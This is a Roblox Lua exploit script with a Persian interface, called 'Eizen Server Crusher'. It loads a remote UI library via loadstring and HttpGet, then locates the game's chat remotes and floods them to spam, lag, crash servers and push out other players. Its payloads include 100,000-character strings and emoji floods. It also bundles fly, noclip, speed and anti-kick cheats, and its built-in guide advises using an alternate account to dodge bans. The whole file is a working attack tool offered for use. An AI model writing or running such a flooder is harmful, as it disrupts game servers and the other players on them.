--// Eizen Server Crusher | نسخه فارسی
--// Replicatestore SendChat Flooder

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

--// سرویس‌ها
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// پنجره اصلی
local Window = Rayfield:CreateWindow({
    Name = "Eizen Server Crusher",
    LoadingTitle = "ایزن کرشر",
    LoadingSubtitle = "SendChat Flooder v2.0",
    ConfigurationSaving = {Enabled = false},
    KeySystem = false
})

--// تب‌ها
local MainTab = Window:CreateTab("اصلی", 4483362458)
local ModeTab = Window:CreateTab("حالت‌ها", 4483362458)
local ChatTab = Window:CreateTab("پیام", 4483362458)
local PlayerTab = Window:CreateTab("پلیر", 4483362458)
local SettingTab = Window:CreateTab("تنظیمات", 4483362458)
local InfoTab = Window:CreateTab("اطلاعات", 4483362458)

--// تنظیمات
getgenv().Crusher = {
    Enabled = false,
    Delay = 0.01,
    Message = "𝗫𝘀𝗵𝗮𝗱𝗼𝘄/𝗛𝗮𝗰𝗸𝗲𝗿 op top",
    CustomMessage = "",
    ChatSpamCount = 100,
    SpamMode = true,
    CrashMode = false,
    LagMode = false,
    KickMode = false,
    FloodServer = false,
    SpamReplicatestore = true,
    SpamTextChat = false,
    AutoRejoin = true,
    InfiniteLoop = true,
    AntiKick = false,
    FlyHack = false,
    NoclipHack = false,
    SpeedValue = 16,
    TargetPlayer = "همه"
}
local S = getgenv().Crusher

--// پیدا کردن SendChat
local function FindSendChat()
    local locations = {
        ReplicatedStorage:FindFirstChild("SendChat"),
        ReplicatedStorage:FindFirstChild("SendMessage"),
        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest"),
        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SendMessage"),
        ReplicatedStorage:FindFirstChild("ChatEvents") and ReplicatedStorage.ChatEvents:FindFirstChild("SendMessage"),
        ReplicatedStorage:FindFirstChild("ChatRemotes") and ReplicatedStorage.ChatRemotes:FindFirstChild("SendChat"),
        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SendChat"),
        ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("SendChat")
    }

    for _, remote in pairs(locations) do
        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
            return remote
        end
    end

    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
            local name = v.Name:lower()
            if name:find("sendchat") or name:find("sendmessage") or name:find("saymessage") then
                return v
            end
        end
    end

    return nil
end

local SendChat = FindSendChat()
local TextChatRemote = nil

local function FindTextChatRemote()
    pcall(function()
        local channels = TextChatService:FindFirstChild("TextChannels")
        if channels then
            for _, c in pairs(channels:GetChildren()) do
                local remote = c:FindFirstChild("SendMessage") or c:FindFirstChild("OnIncomingMessage")
                if remote then
                    TextChatRemote = remote
                    return
                end
            end
        end
    end)
end

FindTextChatRemote()

--// ============================================
--// تب اصلی
--// ============================================
MainTab:CreateSection("⚡ کرشر اصلی")

MainTab:CreateToggle({
    Name = "🟢 روشن کردن کرشر",
    CurrentValue = false,
    Flag = "Enabled",
    Callback = function(v) S.Enabled = v end
})

MainTab:CreateInput({
    Name = "💬 پیام دلخواه",
    PlaceholderText = "پیام خودت رو بنویس...",
    RemoveTextAfterFocusLost = false,
    Flag = "Message",
    Callback = function(v)
        S.CustomMessage = v
        if v ~= "" then S.Message = v end
    end
})

MainTab:CreateSlider({
    Name = "⏱️ سرعت اسپم (ثانیه)",
    Range = {0.01, 1},
    Increment = 0.01,
    Suffix = "s",
    CurrentValue = 0.01,
    Flag = "Delay",
    Callback = function(v) S.Delay = v end
})

MainTab:CreateSlider({
    Name = "📨 تعداد پیام در هر دور",
    Range = {1, 500},
    Increment = 10,
    Suffix = " عدد",
    CurrentValue = 100,
    Flag = "Count",
    Callback = function(v) S.ChatSpamCount = v end
})

MainTab:CreateSection("🎯 دکمه‌های سریع")

MainTab:CreateButton({
    Name = "🚀 شروع کرشر",
    Callback = function()
        S.Enabled = true
        Rayfield:Notify({Title = "ایزن کرشر", Content = "کرشر روشن شد!", Duration = 3})
    end
})

MainTab:CreateButton({
    Name = "🛑 توقف کرشر",
    Callback = function()
        S.Enabled = false
        Rayfield:Notify({Title = "ایزن کرشر", Content = "کرشر خاموش شد!", Duration = 3})
    end
})

MainTab:CreateButton({
    Name = "🔄 پیدا کردن دوباره SendChat",
    Callback = function()
        SendChat = FindSendChat()
        FindTextChatRemote()
        if SendChat then
            Rayfield:Notify({Title = "موفق", Content = "پیدا شد: "..SendChat.Name, Duration = 3})
        else
            Rayfield:Notify({Title = "خطا", Content = "پیدا نشد!", Duration = 3})
        end
    end
})

--// ============================================
--// تب حالت‌ها
--// ============================================
ModeTab:CreateSection("💥 حالت‌های حمله")

ModeTab:CreateToggle({
    Name = "📢 اسپم چت",
    CurrentValue = true,
    Flag = "SpamMode",
    Callback = function(v) S.SpamMode = v end
})

ModeTab:CreateToggle({
    Name = "💣 کرش سرور",
    CurrentValue = false,
    Flag = "CrashMode",
    Callback = function(v) S.CrashMode = v end
})

ModeTab:CreateToggle({
    Name = "🐌 لگ سرور",
    CurrentValue = false,
    Flag = "LagMode",
    Callback = function(v) S.LagMode = v end
})

ModeTab:CreateToggle({
    Name = "👢 کیک پلیرها",
    CurrentValue = false,
    Flag = "KickMode",
    Callback = function(v) S.KickMode = v end
})

ModeTab:CreateToggle({
    Name = "🌊 سیل سرور",
    CurrentValue = false,
    Flag = "Flood",
    Callback = function(v) S.FloodServer = v end
})

ModeTab:CreateSection("🎯 نوع اسپم")

ModeTab:CreateToggle({
    Name = "اسپم Replicatestore",
    CurrentValue = true,
    Flag = "RS_Spam",
    Callback = function(v) S.SpamReplicatestore = v end
})

ModeTab:CreateToggle({
    Name = "اسپم TextChat",
    CurrentValue = false,
    Flag = "TC_Spam",
    Callback = function(v) S.SpamTextChat = v end
})

--// ============================================
--// تب پیام
--// ============================================
ChatTab:CreateSection("💬 پیام‌ها")

ChatTab:CreateInput({
    Name = "📝 پیام اصلی",
    PlaceholderText = "پیام اصلی...",
    RemoveTextAfterFocusLost = false,
    Flag = "Msg1",
    Callback = function(v) S.Message = v end
})

ChatTab:CreateInput({
    Name = "📝 پیام جایگزین",
    PlaceholderText = "پیام دوم...",
    RemoveTextAfterFocusLost = false,
    Flag = "Msg2",
    Callback = function(v) S.CustomMessage = v end
})

ChatTab:CreateSection("📋 پیام‌های آماده")

ChatTab:CreateButton({
    Name = "Xshadow Hacker op top",
    Callback = function()
        S.Message = "𝗫𝘀𝗵𝗮𝗱𝗼𝘄/𝗛𝗮𝗰𝗸𝗲𝗿 op top"
        Rayfield:Notify({Title = "پیام", Content = "پیام ست شد", Duration = 2})
    end
})

ChatTab:CreateButton({
    Name = "ایزن هاب برتره",
    Callback = function()
        S.Message = "Eizen Hub On Top 🔥"
    end
})

ChatTab:CreateButton({
    Name = "سرور داره کرش میکنه",
    Callback = function()
        S.Message = "سرور داره میترکه 💀"
    end
})

ChatTab:CreateButton({
    Name = "ایموجی اسپم",
    Callback = function()
        S.Message = "🔥🔥🔥😎😎😎💀💀💀"
    end
})

ChatTab:CreateButton({
    Name = "خالی (برای کرش)",
    Callback = function()
        S.Message = ""
    end
})

--// ============================================
--// تب پلیر
--// ============================================
PlayerTab:CreateSection("🎯 انتخاب هدف")

local PlayerNames = {"همه"}
for _, p in pairs(Players:GetPlayers()) do
    if p ~= Player then
        table.insert(PlayerNames, p.Name)
    end
end

PlayerTab:CreateDropdown({
    Name = "انتخاب پلیر",
    Options = PlayerNames,
    CurrentOption = "همه",
    Flag = "Target",
    Callback = function(Option) S.TargetPlayer = Option end
})

PlayerTab:CreateButton({
    Name = "🔄 بروزرسانی لیست",
    Callback = function()
        Rayfield:Notify({Title = "بروزرسانی", Content = "اسکریپت رو ریلود کن", Duration = 3})
    end
})

PlayerTab:CreateSection("🛡️ محافظت از خودت")

PlayerTab:CreateToggle({
    Name = "محافظت ضد کیک",
    CurrentValue = false,
    Flag = "AntiKick",
    Callback = function(v) S.AntiKick = v end
})

--// ============================================
--// تب تنظیمات
--// ============================================
SettingTab:CreateSection("⚙️ تنظیمات اصلی")

SettingTab:CreateToggle({
    Name = "🔄 ریجوین خودکار",
    CurrentValue = true,
    Flag = "AutoRejoin",
    Callback = function(v) S.AutoRejoin = v end
})

SettingTab:CreateToggle({
    Name = "🔁 حلقه بی‌نهایت",
    CurrentValue = true,
    Flag = "InfiniteLoop",
    Callback = function(v) S.InfiniteLoop = v end
})

SettingTab:CreateSection("🎮 هک‌های پلیر")

SettingTab:CreateToggle({
    Name = "✈️ پرواز (هنگام کرشر)",
    CurrentValue = false,
    Flag = "Fly",
    Callback = function(v) S.FlyHack = v end
})

SettingTab:CreateToggle({
    Name = "🚪 رد شدن از دیوار",
    CurrentValue = false,
    Flag = "Noclip",
    Callback = function(v) S.NoclipHack = v end
})

SettingTab:CreateSlider({
    Name = "🏃 سرعت راه رفتن",
    Range = {16, 200},
    Increment = 5,
    CurrentValue = 16,
    Flag = "Speed",
    Callback = function(v) S.SpeedValue = v end
})

SettingTab:CreateSection("🛠️ عملیات سرور")

SettingTab:CreateButton({
    Name = "🔁 ریجوین سرور",
    Callback = function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
    end
})

SettingTab:CreateButton({
    Name = "🌍 تغییر سرور",
    Callback = function()
        pcall(function()
            local res = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
            for _, s in pairs(res.data) do
                if s.playing < s.maxPlayers and s.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, Player)
                    break
                end
            end
        end)
    end
})

SettingTab:CreateButton({
    Name = "🚪 ترک سرور",
    Callback = function()
        Player:Kick("توسط ایزن کرشر ترک شد")
    end
})

SettingTab:CreateButton({
    Name = "🗑️ بستن منو",
    Callback = function()
        Rayfield:Destroy()
    end
})

--// ============================================
--// تب اطلاعات
--// ============================================
InfoTab:CreateSection("📊 وضعیت")

local StatusRemote = InfoTab:CreateLabel("SendChat: در حال بررسی...")
local StatusTextChat = InfoTab:CreateLabel("TextChat: در حال بررسی...")

task.spawn(function()
    while task.wait(2) do
        StatusRemote:Set("SendChat: "..(SendChat and SendChat.Name or "پیدا نشد ❌"))
        StatusTextChat:Set("TextChat: "..(TextChatRemote and TextChatRemote.Name or "پیدا نشد ❌"))
    end
end)

InfoTab:CreateSection("📖 راهنما")
InfoTab:CreateLabel("1. دکمه روشن کردن کرشر رو بزن")
InfoTab:CreateLabel("2. از تب حالت‌ها یکی رو انتخاب کن")
InfoTab:CreateLabel("3. از تب پیام، پیامتو تنظیم کن")
InfoTab:CreateLabel("4. سرعت رو روی 0.01 بذار")
InfoTab:CreateLabel("5. صبر کن تا سرور لگ بزنه")
InfoTab:CreateLabel("")
InfoTab:CreateLabel("⚠️ اخطار: ممکنه بن شی!")
InfoTab:CreateLabel("⚠️ فقط روی اکانت فرعی استفاده کن!")

--// ============================================
--// حلقه اصلی
--// ============================================
task.spawn(function()
    while task.wait() do
        if S.Enabled then
            pcall(function()
                if S.SpamMode then
                    for i = 1, S.ChatSpamCount do
                        if not S.Enabled then break end

                        pcall(function()
                            if S.SpamReplicatestore and SendChat then
                                if SendChat:IsA("RemoteEvent") then
                                    pcall(function() SendChat:FireServer(S.Message) end)
                                    pcall(function() SendChat:FireServer(S.Message, "All") end)
                                    pcall(function() SendChat:FireServer("All", S.Message) end)
                                elseif SendChat:IsA("RemoteFunction") then
                                    pcall(function() SendChat:InvokeServer(S.Message) end)
                                end
                            end

                            if S.SpamTextChat and TextChatRemote then
                                pcall(function() TextChatRemote:FireServer(S.Message) end)
                            end
                        end)

                        task.wait(S.Delay)
                    end
                end

                if S.CrashMode then
                    pcall(function()
                        local huge = string.rep("A", 100000)
                        if SendChat then
                            if SendChat:IsA("RemoteEvent") then
                                SendChat:FireServer(huge)
                            else
                                SendChat:InvokeServer(huge)
                            end
                        end
                    end)
                end

                if S.LagMode then
                    pcall(function()
                        for i = 1, 50 do
                            if SendChat and SendChat:IsA("RemoteEvent") then
                                SendChat:FireServer(string.rep(S.Message, 100))
                            end
                        end
                    end)
                end

                if S.KickMode then
                    pcall(function()
                        for _, p in pairs(Players:GetPlayers()) do
                            if p ~= Player then
                                pcall(function()
                                    if SendChat and SendChat:IsA("RemoteEvent") then
                                        SendChat:FireServer("/e "..string.rep("a", 10000), p.Name)
                                    end
                                end)
                            end
                        end
                    end)
                end

                if S.FloodServer then
                    pcall(function()
                        for i = 1, 20 do
                            if SendChat and SendChat:IsA("RemoteEvent") then
                                SendChat:FireServer(string.rep("💀", 5000))
                            end
                            task.wait(0.05)
                        end
                    end)
                end
            end)

            if not S.SpamLoop and not S.CrashMode and not S.LagMode and not S.KickMode and not S.FloodServer then
                S.Enabled = false
            end
        end
    end
end)

--// پرواز
local flyBV, flyBG
RunService.RenderStepped:Connect(function()
    pcall(function()
        local char = Player.Character or Player.CharacterAdded:Wait()
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end

        if S.FlyHack then
            if not flyBV then
                flyBV = Instance.new("BodyVelocity", hrp)
                flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                flyBG = Instance.new("BodyGyro", hrp)
                flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                flyBG.P = 9e4
            end
            hum.PlatformStand = true
            local dir = Vector3.new(0, 0, 0)
            if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
            flyBV.Velocity = dir * 80
            flyBG.CFrame = Camera.CFrame
        else
            if flyBV then flyBV:Destroy() flyBV = nil end
            if flyBG then flyBG:Destroy() flyBG = nil end
            hum.PlatformStand = false
        end

        if S.NoclipHack then
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = false end
            end
        end

        hum.WalkSpeed = S.SpeedValue
    end)
end)

--// ضد کیک
task.spawn(function()
    while task.wait(1) do
        if S.AntiKick then
            pcall(function()
                Player.Kick = function() end
            end)
        end
    end
end)

--// ریجوین خودکار
task.spawn(function()
    while task.wait(5) do
        if S.AutoRejoin and not Player.Parent then
            task.wait(3)
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
        end
    end
end)

--// نوتیف
if SendChat then
    Rayfield:Notify({
        Title = "ایزن کرشر ✅",
        Content = "SendChat پیدا شد: "..SendChat.Name,
        Duration = 5
    })
else
    Rayfield:Notify({
        Title = "⚠️ اخطار",
        Content = "SendChat پیدا نشد! بعضی بازی‌ها ندارن",
        Duration = 5
    })
end
 🔥
